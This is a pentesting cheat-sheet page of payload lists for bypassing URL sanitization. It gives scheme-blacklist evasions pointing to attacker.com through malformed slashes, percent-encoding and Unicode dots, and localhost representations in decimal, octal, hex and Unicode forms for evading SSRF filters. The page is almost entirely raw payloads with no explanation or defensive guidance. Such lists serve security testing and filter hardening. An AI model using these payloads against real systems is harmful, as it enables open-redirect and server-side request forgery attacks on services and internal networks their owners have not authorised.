# Tricks - Bypass URL Sanitization

### Description
details
</br>&nbsp;

## Sub Techniques
### 1. Schema Blacklist Bypass
```
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
/\attacker.com/
\/attacker.com/
\/\/attacker%2ecom/
/\/attacker%2ecom/
/attacker.com
%0D%0A/attacker.com
attacker。com
ⒶⓉⓉⒶⒸⓀⒺⓡ.Ⓒⓞⓜ
////%09/attacker.com/
///%09/attacker.com/
//%09/attacker.com/
////216.58.214.206/
///216.58.214.206/
//216.58.214.206/
////3627734734
///3627734734
//3627734734
//0x7f000001
%2f%2f%2f%2f216.58.214.206
%2f%2f%2f216.58.214.206
%2f%2f216.58.214.206
////attacker%E3%80%82com
```

### 2. Host Whitelist Bypass
- See [Trick - Host Whitelist Bypass](./Trick%20-%20Host%20Whitelist%20Bypass.md)

### 3. Localhost Format Bypass
```
#
http://localhost:80
http://127.0.0.1:80
http://0.0.0.0:80
http://[::]:80/
http://①②⑦.⓪.⓪.⓪

# CDIR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127。0。0。1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Malformed
http://127.1:80
http://0
```

<br>&nbsp;
## References:
[Reference](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass)</br>

<br>&nbsp;
## Support
You can Follow [me](https://twitter.com/MeAsHacker_HNA) on twitter or
<br><br><a href="https://www.buymeacoffee.com/NafisiAslH" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
